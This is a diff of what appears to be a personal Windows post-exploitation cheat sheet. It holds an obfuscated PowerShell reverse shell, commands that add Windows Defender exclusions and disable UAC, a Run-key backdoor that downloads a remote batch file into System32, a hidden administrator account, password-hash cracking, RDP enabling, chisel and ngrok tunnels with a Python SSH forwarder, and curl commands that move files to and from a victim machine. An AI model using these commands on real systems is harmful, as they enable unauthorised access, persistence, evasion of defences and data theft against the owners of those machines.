@@ -1,15 +1,5 @@
-With Administrator Privs
-powershell Set-MpPreference -ExclusionPath <path> 
-to verify it was excluded :
-powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
----------------------------------------------------------------------------------------------------------------
-With Administrator Privs
-To disable UAC :
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
-TO verify it's disabled :
-reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
-To enable it again :
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
+obfuscated powershell 
+$C=new-object net.sockets.tcpclient('192.168.1.16',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+'PS '+(pwd).Path+'> ';$SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()
 ---------------------------------------------------------------------------------------------------------------
 Checking Administrator Privs in run.bat
 CLS
@@ -34,16 +24,174 @@ with Resource Hacker :
   </trustInfo>
 </assembly>
 ---------------------------------------------------------------------------------------------------------------
-obfuscated powershell 
-$C=new-object net.sockets.tcpclient('192.168.1.16',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+'PS '+(pwd).Path+'> ';$SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()
+To Display AVs names :
+wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName
+---------------------------------------------------------------------------------------------------------------
+With Administrator Privs 
+to add an Excluded path to Windows Defender :
+powershell Set-MpPreference -ExclusionPath <path> 
+to verify it was excluded :
+powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
+---------------------------------------------------------------------------------------------------------------
+With Administrator Privs 
+To disable UAC :
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+TO verify it's disabled :
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
+To enable it again :
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
+---------------------------------------------------------------------------------------------------------------
+install python on the target with administrator privs :
+after transfering python32.exe or python64.exe based on the arch of the system 
+.\python.exe /quiet InstallAllUsers=1 PrependPath=1
 ---------------------------------------------------------------------------------------------------------------
 With Administrator Privs
 backdoor runs after BIOS : 
 cd C:\Windows\system32
-curl https://raw.githubusercontent.com/omarsamyX0/shell3/main/start.vbs -o start.vbs
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /t REG_SZ /d "%SystemRoot%\System32\start.vbs" /f
+curl https://raw.githubusercontent.com/0x2034/shell/main/start.bat -o start.bat
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /t REG_SZ /d "%SystemRoot%\System32\start.bat" /f
 to verify it's added : 
 reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start"
 to delete it :
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /f
+---------------------------------------------------------------------------------------------------------------
+In meterpreter with administrator privs to enable RDP :
+1 - cracking current users's hash --> john <hash> --wordlist=/usr/share/wordlists/rockyou.txt --format=NT | hashcat <hash> -m 1000 /usr/share/wordlist/rockyou.txt
+or creating a Hidden user :
+    net user <os> <123> /add /active:no
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v <os> /t REG_DWORD /d 0 /f
+    net user <os> /active:yes
+    net localgroup Administrators <os> /add
+    net localgroup "Remote Desktop Users" <os> /add
+    icacls "C:\Users\<Administrator>" /grant <os>:(OI)(CI)RX
+2 - use post/windows/manage/enable_rdp
+3 - set session <id>
+4 - run 
+5 - from new terminal --> xfreerdp /u:<user> /v:<ip> /p:<password> 
+In a shell with administrator privs to enable RDP :
+1 - cracking current users's hash --> john <hash> --wordlist=/usr/share/wordlists/rockyou.txt --format=NT | hashcat <hash> -m 1000 /usr/share/wordlist/rockyou.txt
+or creating a Hidden user :
+    net user <os> <123> /add /active:no
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v <os> /t REG_DWORD /d 0 /f
+    net user <os> /active:yes
+    net localgroup Administrators <os> /add
+    net localgroup "Remote Desktop Users" os /add
+    icacls "C:\Users\<Administrator>" /grant <os>:(OI)(CI)RX
+2 - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+3 - netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+4 - to verify it's enabled if the value = 0 --> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+5 - from new terminal --> xfreerdp /u:<user> /v:<ip> /p:<password> 
+To Disable the RDP with administrator privs:
+1 - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+2 - netsh advfirewall firewall set rule group="remote desktop" new enable=No
+---------------------------------------------------------------------------------------------------------------
+RDP externally after enable it on the target:
+sudo nano /etc/proxychains4.conf
+dynamic_chain 
+socks5 127.0.0.1 1080
+on victim's machine chisel.exe client <ip>:<port> R:socks
+from new terminal --> chisel server -p <forwarded port 4444> --reverse
+proxychains4 xfreerdp /u:<user> /v:<local ip> /p:<password>
+or Using SSH for the RDP port forward only :
+in python script this command ssh -R 127.0.0.1:<22>:<192.168.1.5>:<3389> <os>@<7.tcp.eu.ngrok.io> -p <11750>
+firstly --> pip install paramiko
+
+import paramiko
+import logging
+import socket
+import select
+logging.basicConfig(level=logging.DEBUG)
+logger = logging.getLogger(__name__)
+def ssh_tunnel():
+    hostname = "<0.tcp.eu.ngrok.io>"
+    port = <19512>
+    username = "<os>"
+    password = "<123>"  
+    local_bind_address = ('<127.0.0.1>', <22>)
+    remote_bind_address = ('<192.168.1.5>', <3389>)
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        logger.info(f"Connecting to {hostname}:{port} as {username}")
+        ssh_client.connect(hostname, port=port, username=username, password=password)
+        logger.info("Connection established")
+        transport = ssh_client.get_transport()
+        logger.debug(f"Requesting remote port forward from {local_bind_address} to {remote_bind_address}")
+        transport.request_port_forward(local_bind_address[0], local_bind_address[1])
+        while True:
+            chan = transport.accept(1000)
+            if chan is None:
+                continue
+            logger.debug("Channel accepted")
+            forward_tunnel(chan, remote_bind_address[0], remote_bind_address[1])
+    except paramiko.AuthenticationException:
+        logger.error("Authentication failed. Please check your credentials.")
+    except paramiko.SSHException as ssh_ex:
+        logger.error(f"SSH error: {ssh_ex}")
+    except Exception as e:
+        logger.error(f"An error occurred: {e}")
+    finally:
+        ssh_client.close()
+        logger.info("SSH connection closed")
+def forward_tunnel(chan, host, port):
+    sock = socket.socket()
+    try:
+        sock.connect((host, port))
+    except Exception as e:
+        logger.error(f"Forwarding request to {host}:{port} failed: {e}")
+        return
+    logger.info(f"Connected! Tunnel open {chan.origin_addr} -> {chan.getpeername()} -> {host}:{port}")
+    while True:
+        r, w, x = select.select([sock, chan], [], [])
+        if sock in r:
+            data = sock.recv(1024)
+            if len(data) == 0:
+                break
+            chan.sendall(data)
+        if chan in r:
+            data = chan.recv(1024)
+            if len(data) == 0:
+                break
+            sock.sendall(data)
+    chan.close()
+    sock.close()
+if __name__ == "__main__":
+    ssh_tunnel()
+
+from new terminal --> xfreerdp /v:localhost:<22> /u:<> /p:<>
+---------------------------------------------------------------------------------------------------------------
+Transfer file using curl externally :
+1- sudo service apache2 start
+2- ssh -R 80:192.168.1.16:8080 serveo.net
+3- to upload from the victim :
+   python file_upload_server.py <forwarded port 8080> 
+   curl -F "file=@o.txt" <https://dd8db79ed3eb810161585741f4a60132.serveo.net>
+4- to download into the victim :
+   python -m http.server <forwarded port 8080> 
+   curl <https://dd8db79ed3eb810161585741f4a60132.serveo.net/os.py -o os.py> 
+or 
+1- ngrok http 8080
+2- to upload from the victim :
+   python file_upload_server.py <forwarded port 8080> 
+   curl -F "file=@o.txt" <https://d335-5-149-250-239.ngrok-free.app>
+3- to download into the victim :
+   python -m http.server <forwarded port 8080> 
+   curl <https://https://d335-5-149-250-239.ngrok-free.app/os.py -o os.py> 
+---------------------------------------------------------------------------------------------------------------
+ngrok multiple ports in the same windows :
+1- in the config file :
+sudo nano /home/<os>/.config/ngrok/ngrok.yml
+    version: "2"
+    authtoken: <>
+    tunnels:
+      tcp1:
+        addr: 4444
+        proto: tcp
+      tcp2:
+        addr: 2222
+        proto: tcp
+      tcp3:
+        addr: 22
+        proto: tcp
+2- to run it ngrok start --all
 ---------------------------------------------------------------------------------------------------------------
